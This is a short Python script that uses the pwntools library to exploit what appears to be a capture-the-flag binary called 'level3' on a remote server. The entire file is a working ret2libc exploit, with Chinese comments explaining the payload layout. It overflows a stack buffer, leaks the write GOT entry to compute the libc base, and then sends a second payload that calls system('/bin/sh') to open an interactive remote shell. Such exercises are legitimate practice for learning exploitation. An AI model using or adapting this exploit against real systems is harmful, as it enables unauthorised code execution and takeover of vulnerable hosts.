from pwn import *
 
sh = remote('124.126.19.106',35860)
#sh=process('./level3')
 
#context.log_level = 'debug'
elf=ELF('./level3')
libc=ELF('./libc_32.so.6')

#get func address
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']
#char[88] ebp  write函数地址  write函数返回地址(返回到main函数)  write函数参数一(1)  write函数参数二(write_got地址)  write函数参数三(写4字节)
payload = flat('A'*0x88, p32(0xdeadbeef), p32(write_plt), p32(main_addr), p32(1), p32(write_got), p32(0xdeadbeef))
# 0xdeadbeef 可随意如 p32(4)，填充4字节, 上面就是把write_got输出, 然后返回main头部
 
sh.sendlineafter("Input:\n",payload)
 
#leak write's addr in got
write_got_addr = u32(sh.recv()[:4])
print( 'write_got address is',hex(write_got_addr))
 
#leak libc's addr 计算lib库加载基址
libc_base = write_got_addr - libc.symbols['write']
print( 'libc address is',hex(libc_base))
 
#get system's addr
sys_addr = libc_base + libc.symbols['system']
print( 'system address is',hex(sys_addr))
 
#get bin/sh 's addr    strings -a -t x libc_32.so.6 | grep "/bin/sh"
#libc.search("/bin/sh").next()
bin_sh_addr = libc_base + 0x15902b
print( '/bin/sh address is',hex(bin_sh_addr))
 
#get second payload
##char[88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)
payload0 = flat('A'*0x88, p32(0xdeadbeef), p32(sys_addr), p32(0xdeadbeef), p32(bin_sh_addr))
 
sh.sendline(payload0)
sh.interactive()